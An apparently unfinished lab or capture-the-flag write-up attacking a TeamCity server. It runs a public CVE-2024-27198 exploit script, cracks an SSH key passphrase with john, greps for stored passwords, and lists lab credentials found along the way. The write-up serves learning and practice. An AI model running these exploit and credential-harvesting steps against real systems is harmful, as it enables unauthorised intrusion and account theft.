#InProgress 
```IP
192.168.102.91
```
# Enumeration

## HTTP 80

login redirects us to http://teams.onlyrands.com/ so we add it to /etc/hosts

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241202105341.png?raw=true)

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241202105420.png?raw=true)


# Exploitation


https://github.com/W01fh4cker/CVE-2024-27198-RCE

```
python CVE-2024-27198-RCE.py -t http://teams.onlyrands.com -u admin -p admin
```

we can now login and we discover some users
```
patriciam
matthewa
marcot
kathleenw
```

we can create a backup and investigate
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241202120231.png?raw=true)

the database contains credentials

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241202120214.png?raw=true)

password doesnt crack so we try to execute commands with the previous exploit
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241202120941.png?raw=true)
we get an error. Apparently we need to activate debug settings
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241202120702.png?raw=true)
even with this, it still doesnt work
we find something in the building porjects
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241202121254.png?raw=true)
an id_rsa key. We need a password tho
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241202121622.png?raw=true)
we crack it with 
```
ssh2john id_rsa
```
```
john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241202122025.png?raw=true)
```
cheer
```
```
ssh marcot@192.168.102.91 -i id_rsa
```
# PrivEsc

## Manual

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241202122213.png?raw=true)

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241202122341.png?raw=true)
searching for passwords we find
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241202130232.png?raw=true)
```
IdealismEngineAshen476
```
```
su - matthewa
```

```
grep --color=auto -rnw '/home/freelancers/matthewa/' -ie "PASSWORD" --color=always 2> /dev/null
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241202131725.png?raw=true)
```
RefriedScabbedWasting502
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241202133817.png?raw=true)
we have su permissions over 
```
/usr/bin/systemctl status teamcity-server.service
```

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241202133754.png?raw=true)
## Automated

### Peass
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241202124706.png?raw=true)
```
/home/freelancers/marcot/.gnupg/pubring.kbx
/home/freelancers/marcot/.gnupg/trustdb.gpg
```
### Mimikatz

# Lateral Movement
